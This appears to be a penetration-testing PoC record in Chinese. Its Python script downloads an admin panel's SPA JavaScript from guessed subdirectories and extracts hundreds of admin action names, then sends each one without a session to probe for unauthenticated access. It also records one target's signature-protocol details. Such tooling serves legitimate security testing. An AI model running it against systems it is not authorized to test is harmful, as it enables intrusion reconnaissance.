# SPA 管理后台源码未授权下载 + action 全量未授权测试（含子目录路径发现）

- **code**: spa-管理后台源码未授权下载-action-全量未授权测试-含子目录路径发现
- **kind**: poc
- **category**: auth-bypass
- **component**: IMService 管理后台 SPA (ECDSA P-256 设备签名协议)
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 https://example.com/IMService/（203.0.113.13，Tomcat 9.0.122）验证：首页 HTML 的 script src="example.com?v=8" 但 /IMService/example.com 返回 404，真实路径是 /IMService/admin/example.com（137116 字节，Content-Type: application/javascript）。递归下载到 28 个模块约 400KB。提取出 245 个管理 action（finance.adjust/roles.assign/withdrawals.process/sms.list/sms.legacy/users.edit 等）与 17 个接口路径。未授权测试结论：245 个 action 中 77 个返回 401 AUTHENTICATION_REQUIRED（含 sms.list/sms.legacy/users.search 等高敏接口）、168 个 404、0 个 200 —— 管理 API 鉴权到位，短信验证码未授权读取路径已排除。另注意：管理登录用 ECDSA P-256 设备签名（canonical 串 ['LHZSV2',method,url.pathname,sha256(''),sha256(body),timestamp,nonce,requestId,sessionId,sha256(credential)].join('\n')，签名头 X-Device-Signature base64url 的 r||s 原始格式），auth/admin/start 返回 mfaRequired:false。
- **path**: pocs/spa-管理后台源码未授权下载-action-全量未授权测试-含子目录路径发现/spa_admin_unauth_audit.py
- **tags**: spa,管理后台,源码泄露,未授权访问,action枚举,ecdsa
- **created_at**: 2026-10-03T16:42:00.899Z
- **found_by**: vuln-scan

## 描述

SPA 管理后台源码未授权下载（含子目录路径发现与 import 递归）+ action 名提取 + 聚合入口全量未授权测试。适用于任何 React/Vue 打包的 ES module 管理后台。

## 用法

```
1) 改 BASE 为管理后台根路径（如 https://target/Admin/）；2) 若下载失败，手工看首页 HTML 的 &lt;script src&gt; 并调整 subdirs 候选目录；3) python spa_admin_unauth_audit.py。<br>输出：提取的 action 清单 + 未授权测试分类（200=漏洞 / 401=鉴权健全 / 404=通道不符）。<br>注意：请求头必须带 X-Security-Version（值从源码的 api.js 里读），否则可能全部 400 INVALID_INPUT。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""管理后台 SPA 源码获取 + action 全量未授权测试

## 适用场景
现代 SPA 管理后台（React/Vue 打包成 ES module），前端源码未授权可下载，
源码里含完整 API 契约（action 名、路径、请求头规范、签名算法）。

## 关键手法

### 1. 找到真实的静态资源路径
SPA 常有路由 fallback：请求 /IMService/example.com 可能返回 404，而请求根路径
/IMService/ 返回首页 HTML。真实资源往往在 **子目录** 下（如 /IMService/admin/）。
读首页 HTML 的 <script src="..."> 拿到文件名，再枚举候选目录：
    /IMService/admin/ , /IMService/static/js/ , /IMService/assets/ , /IMService/js/
命中后（Content-Type: application/javascript）即拿到全部业务逻辑。

### 2. 顺着 import 语句把模块拉全
入口 JS 里会有 `import ... from './xxx.js'` 或 `import('./xxx.js')`，
正则提取后逐个下载 —— 通常能拿到 20~30 个子模块（api.js 定义接口契约，
各业务模块定义 action 名）。

### 3. 提取 action 名做全量未授权测试
从源码正则提取 action 名（形如 `action: 'a.b.c'`、`call('admin','query','x.y')`），
对聚合入口发**不带任何 session 的**请求，按响应码分类：
    401 => 接口存在且要求鉴权（鉴权健全）
    404 => 该 action 不属于此通道
    200 => 未授权可读（漏洞！）

## 重要：请求头规范（缺了会全部返回 400 INVALID_INPUT）
这类自研安全协议常要求：
    Content-Type: application/json
    X-Security-Version: 2
"""
import ssl, urllib.request, urllib.error, json, re, os, sys, time

PROXY = "http://127.0.0.1:7892"
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
op = urllib.request.build_opener(
    urllib.request.ProxyHandler({"http": PROXY, "https": PROXY}),
    urllib.request.HTTPSHandler(context=ctx))
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131 Safari/537.36"


def fetch(url, timeout=30, n=3000000, extra=None):
    h = {"User-Agent": UA, "Connection": "close", "Accept": "*/*"}
    if extra:
        h.update(extra)
    r = urllib.request.Request(url, headers=h)
    try:
        with op.open(r, timeout=timeout) as resp:
            return resp.status, resp.read(n), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(n), dict(e.headers)
    except Exception as e:
        return -1, f"{type(e).__name__}: {e}".encode(), {}


def download_spa(base, subdirs=("admin/", "static/js/", "assets/", "js/", "")):
    """下载 SPA 前端源码，返回 {filename: source}"""
    st, html, _ = fetch(base)
    if st != 200:
        print(f"[!] 首页 {base} -> {st}")
        return {}
    text = html.decode("utf-8", "replace")
    refs = re.findall(r'(?:src|href)\s*=\s*["\']([^"\']+\.(?:js|css))["\']', text)
    print(f"[+] 首页引用的资源: {refs}")
    got = {}
    for ref in refs:
        fname = ref.split("/")[-1].split("?")[0]
        for sub in subdirs:
            url = base.rstrip("/") + "/" + sub + fname
            st, raw, h = fetch(url, timeout=25)
            if st == 200 and len(raw) > 500:
                got[fname] = raw.decode("utf-8", "replace")
                print(f"    [200] {url}  ({len(raw)} bytes)")
                # 顺着 import 拉子模块
                for m in set(re.findall(r'''(?:from|import\s*\()\s*["\']\./([A-Za-z0-9_.-]+\.js)["\']''',
                                        got[fname])):
                    st2, raw2, _ = fetch(base.rstrip("/") + "/" + sub + m, timeout=25)
                    if st2 == 200 and len(raw2) > 100:
                        got[m] = raw2.decode("utf-8", "replace")
                        print(f"      [200] {m}  ({len(raw2)} bytes)")
                break
    return got


def extract_actions(sources):
    """从源码提取 action 名"""
    actions = set()
    for src in sources.values():
        for m in re.findall(r'action\s*[:=]\s*["\'`]([A-Za-z0-9_.\-]{2,60})["\'`]', src):
            actions.add(m)
        for m in re.findall(r'["\'`]([a-z][a-zA-Z0-9_]*(?:\.[a-z][a-zA-Z0-9_]*){1,3})["\'`]', src):
            actions.add(m)
    return sorted(actions)


def test_unauth(base_url, query_path, actions, timeout=15):
    """对聚合入口发未认证请求，按响应码分类"""
    res = {"200": [], "401": [], "404": [], "other": []}
    url = base_url.rstrip("/") + query_path
    for a in actions:
        body = json.dumps({"action": a, "payload": "{}", "operationId": "0" * 20}).encode()
        h = {"User-Agent": UA, "Content-Type": "application/json",
             "X-Security-Version": "2", "Connection": "close"}
        r = urllib.request.Request(url, data=body, headers=h, method="POST")
        try:
            with op.open(r, timeout=timeout) as resp:
                st, txt = resp.status, resp.read(1000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            st, txt = e.code, e.read(1000).decode("utf-8", "replace")
        except Exception as e:
            st, txt = -1, str(e)
        key = str(st) if str(st) in res else "other"
        res[key].append((a, txt[:80]))
        if st == 200:
            print(f"  [!!! 200] {a}  {txt[:150]}")
        time.sleep(0.04)
    return res


if __name__ == "__main__":
    BASE = "https://example.com/IMService/"
    srcs = download_spa(BASE)
    acts = extract_actions(srcs)
    print(f"\n[+] 提取到 {len(acts)} 个 action 名")
    res = test_unauth("https://example.com/IMService/v27", "/admin/query", acts)
    print(f"\n=== 未授权测试结果: 200={len(res['200'])}  401={len(res['401'])}  404={len(res['404'])}")
    if not res["200"]:
        print("    结论：管理 API 鉴权到位，无未授权接口")

```
